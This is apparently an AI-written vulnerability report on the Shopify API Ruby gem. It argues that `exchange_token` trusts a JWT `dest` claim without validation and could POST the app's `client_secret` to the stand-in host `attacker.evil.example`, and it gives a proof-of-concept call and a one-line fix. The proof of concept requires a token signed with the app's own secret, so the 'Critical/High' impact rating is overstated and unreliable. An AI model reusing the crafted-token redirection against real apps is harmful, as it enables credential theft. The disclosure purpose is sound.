Found the exploitable analog: `TokenExchange.exchange_token` builds the HTTP request host from an unvalidated shop value.

### Title
OAuth token exchange sends `client_secret` to an attacker-controlled host because the JWT `dest` claim is trusted without domain validation - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the request host from the session token's `dest` claim without ever passing it through `Utils::ShopValidator.sanitize!`, unlike the sibling method `migrate_to_expiring_token` in the same file which does call `sanitize!`. Since `HttpClient` builds `@base_uri` directly from `session.shop` [1](#0-0) , an attacker who controls the `dest` claim of a validly-signed-looking JWT (or who can get the host application to call `exchange_token` with a session token whose `dest` was never checked against Shopify's domain suffixes) can steer the outbound POST — which carries `client_id` and `client_secret` in the body — to a host of their choosing.

### Finding Description
`JwtPayload#shop` simply strips `"https://"` from the `dest` claim and returns it verbatim [2](#0-1) . `JwtPayload.new` only validates the HMAC signature (using `Context.api_secret_key`), the `aud` claim, and standard JWT time claims (`exp`/`nbf`/`iat`) [3](#0-2)  — it never checks that `dest`/`iss` is a `*.myshopify.com`/`myshopify.io`/etc. domain the way `Utils::ShopValidator` does [4](#0-3) .

`exchange_token` takes this unchecked value and uses it directly to build the session used for the outbound HTTP call:
```
jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
dest_shop = jwt_payload.shop
...
shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
...
client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
``` [5](#0-4) 

`HttpClient#initialize` then sets `@base_uri = "https://#{api_host || session.shop}"` — when `Context.api_host` is not configured (the common case), the request host is exactly `dest_shop` [1](#0-0) . The POST body sent to that host includes `client_id` and `client_secret` [6](#0-5) .

Contrast this with `migrate_to_expiring_token` in the very same module, which correctly enforces the binding "host validated == host that receives `client_secret`" via `Utils::ShopValidator.sanitize!(shop)` before constructing the session used for the HTTP call [7](#0-6) . `exchange_token` breaks this same equality: `validated_host == request_host` does not hold, because the `dest` claim is never routed through `ShopValidator`.

The bug-class mapping to the external report is structural: both bugs stem from a value that is nominally "checked" (a JWT signature check, analogous to the "already assigned" check in the Solidity code) being trusted to also imply a *different, unstated invariant* (domain trust, analogous to "value is nonzero") that it does not actually guarantee.

### Impact Explanation
This crosses the "SSRF with the app's credentials" / "credential leakage" boundary described in scope: the app's `client_id` and `client_secret` are sent to a host derived from unvalidated input controlled by whoever crafted the `dest` claim of the token passed to `exchange_token`. If a host application obtains a session token from a source that does not itself constrain `dest` to a real Shopify shop (e.g., relays or forwards a token, or the token originates from a non-strictly-validated redirect/embed flow), this gem will POST the app's `client_secret` to an attacker-chosen domain, i.e., credential exfiltration/SSRF carrying the app's credentials — a Critical/High impact per the rules.

### Likelihood Explanation
Exploitability depends on the host application feeding an untrusted/forwardable session token into `exchange_token` (Shopify's own embedded-app JS normally supplies a token whose `dest` is enforced by Shopify infra, but this gem provides no defense-in-depth check itself, unlike its sibling method). Given the JWT signature check only proves the token was signed with the app's `api_secret_key` and says nothing about `dest`'s domain, any code path that lets a caller influence or replay a session token (or a future/alternate token issuer using the same secret) reaches this sink directly through this gem's own code, with no host-application misuse of documented API required beyond calling `exchange_token` as documented.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token`, after computing `dest_shop = jwt_payload.shop`, validate it the same way `migrate_to_expiring_token` does: `dest_shop = Utils::ShopValidator.sanitize!(jwt_payload.shop)` before constructing `shop_session`/the `HttpClient`. This restores the invariant that only a domain in `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` (or a configured custom myshopify domain) can ever receive the app's `client_secret`.

### Proof of Concept
1. Attacker crafts (or otherwise obtains) a valid JWT session token whose payload includes:
   - `aud`: the victim app's real `api_key`
   - `dest`: `"https://attacker.evil.example"`
   - valid `exp`/`nbf`/`iat`, and signed with the app's `api_secret_key` (e.g., leaked, guessed, or forwarded through a component that has access to sign such tokens).
2. Attacker gets this token passed to:
```ruby
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: crafted_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN
)
```
3. `jwt_payload.shop` returns `"attacker.evil.example"` unchecked [2](#0-1) .
4. `HttpClient.new(session: shop_session, base_path: "/admin/oauth")` builds `@base_uri_and_path = "https://attacker.evil.example/admin/oauth"` [1](#0-0) .
5. The gem POSTs `{ client_id, client_secret, grant_type, subject_token, ... }` to `https://attacker.evil.example/admin/oauth/access_token`, leaking `client_secret` to the attacker's server [8](#0-7) .
